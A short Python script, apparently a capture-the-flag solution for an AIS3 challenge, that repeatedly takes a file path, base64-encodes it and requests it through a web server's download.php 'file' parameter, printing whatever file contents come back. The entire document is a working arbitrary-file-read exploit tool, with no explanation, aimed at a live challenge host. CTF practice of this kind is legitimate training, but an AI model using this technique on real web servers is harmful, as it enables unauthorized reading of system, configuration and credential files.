from base64 import b64encode
import readline
import requests as rq

url = 'http://chals1.ais3.org:9453/download.php'


def read_file(path):
    path = b64encode(path.encode())
    params = {'file': path, 'name': 'trash.txt.tar.gz'}
    res = rq.get(url, params)
    return res.text


while True:
    path = input('> ')
    res = read_file(path)
    print(res)
